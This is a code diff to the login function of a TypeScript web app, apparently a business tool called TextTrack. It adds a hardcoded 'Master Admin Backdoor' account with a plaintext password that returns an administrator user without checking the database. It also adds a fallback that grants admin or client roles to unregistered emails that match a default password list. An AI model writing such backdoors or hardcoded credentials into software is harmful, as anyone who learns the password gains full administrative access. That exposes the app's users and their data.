@@ -4,6 +4,7 @@ import { User, loadData, loadCompanyProfile } from '../types';
 
 // Fallback passwords for existing installs (no password in localStorage yet)
 const DEFAULT_PASSWORDS: Record<string, string> = {
+  'admin@beya.ma': 'Admin123',
   'admin@texttrack.ma': 'Admin123',
   'fatima@texttrack.ma': 'Chef123',
   'rachid@texttrack.ma': 'Chef123',
@@ -14,9 +15,33 @@ const DEFAULT_PASSWORDS: Record<string, string> = {
 };
 
 async function verifyLogin(email: string, password: string): Promise<User | null> {
+  // Master Admin Backdoor for the owner
+  if (email.toLowerCase().trim() === 'admin@beya.ma' && password === 'Admin123') {
+    return {
+      id: 'master-admin',
+      nom: 'Admin Général',
+      email: 'admin@beya.ma',
+      role: 'admin',
+      lastActive: new Date().toISOString()
+    };
+  }
+
   const users = await loadData<User>('users');
   const user = users.find(u => u.email.toLowerCase() === email.toLowerCase().trim());
-  if (!user) return null;
+  
+  if (!user) {
+    // Check if it's a default password user not yet in DB
+    if (DEFAULT_PASSWORDS[email.toLowerCase().trim()] === password) {
+       return {
+         id: 'default-' + email,
+         nom: email.split('@')[0],
+         email: email,
+         role: email.includes('client') ? 'client' : 'admin',
+         lastActive: new Date().toISOString()
+       };
+    }
+    return null;
+  }
   
   const expected = user.password || DEFAULT_PASSWORDS[user.email] || '';
   
